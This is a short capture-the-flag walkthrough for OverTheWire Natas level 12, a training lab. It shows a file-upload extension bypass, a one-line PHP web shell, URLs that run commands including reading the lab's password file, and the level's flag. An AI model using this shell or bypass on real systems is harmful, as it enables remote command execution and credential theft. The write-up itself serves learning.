a.	In this I got a file upload function, after reviewing the source code. The conditions in the source code:
i.	File size should be less then or equal to 1 KB. 
b.	Testing further, I try to upload an empty PHP file to see the flow.
c.	The flow was 
i.	Challenge auto randomizes the file name with the extension to .jpg 
d.	After more inspection there is a line in the source code;
  
	The random file name and .jpg allocation from the clint side.
e.	Now, create a web shell less the 1 KB and upload it. 
f.	As I know the application is based on PHP so I use PHP web shell. 

		<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
g.	Before upload that file, I changed .jpg to .php from the inspect element. 

 

h.	After uploading the shell got executed and the result was like.
 

i.	As in the web shell code e is the variable, so I try to do ls, then the URL became. 
http://natas12.natas.labs.overthewire.org/upload/dkrgv53guj.php?e=ls

Output:

 

j.	According to the previous levels, I know that the password file for natas 13 was saved in /etc/natas_webpass/natas13
k.	Then the URL became:
http://natas12.natas.labs.overthewire.org/upload/dkrgv53guj.php?e=cat%20/etc/natas_webpass/natas13
l.	And DONE, FLAG was trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
